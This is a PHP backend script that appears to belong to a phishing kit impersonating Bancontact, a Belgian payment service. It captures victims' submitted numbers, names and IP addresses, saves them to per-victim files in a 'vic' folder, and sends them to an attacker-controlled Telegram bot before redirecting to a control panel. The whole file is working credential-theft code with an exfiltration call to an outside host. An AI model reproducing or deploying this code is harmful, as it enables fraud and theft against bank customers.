<?php

include "config.php";

if (isset($_POST['number']) && isset($_POST['ip']) && isset($_GET['tk']) && isset($_POST['name'])) {
    $ip4 = $_POST['ip'];
    $tk = $_GET['tk'];
	$name = $_POST['name'];
	$name2 = $_GET['name'];

    // Sanitize IP and create file name
    $get_name_file = $ip4;

    // Determine filename and token based on tk value

    // Write number to the first file
	
$file_path_1 = "../../../vic/{$get_name_file}+.txt";

if (isset($_POST['number2']) && $_POST['number2'] !== '') {
    $content = $_POST['number'] . " | " . $_POST['number2'];
} else {
    $content = $_POST['number'];
}

// THIS LINE OVERWRITES THE FILE
file_put_contents($file_path_1, $content . PHP_EOL);

    // Write token to the second file
    $file_path_2 = "../../../vic/{$get_name_file}.txt";
    file_put_contents($file_path_2, $name);

    // Redirect after writing
	
		$message=
       "   -> Bancontact Brute (BE) 🇧🇪 - INFO\r\n" . 
	   "   -> > < > < > < > < > <\n". 
       "   -> [📍] IP : ".$ip4."\n". 
       "   -> [👾] Token BOT : [".$_POST['number']."] ".$name." ✅\n". 
	   "   -> > < > < > < > < > <\n". 
	   "   -> @BLANCO\n";

   
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       //reset_data();
	
	
    header("Location: ../../../1control.php?ip=".$ip4);
    exit();
}

?>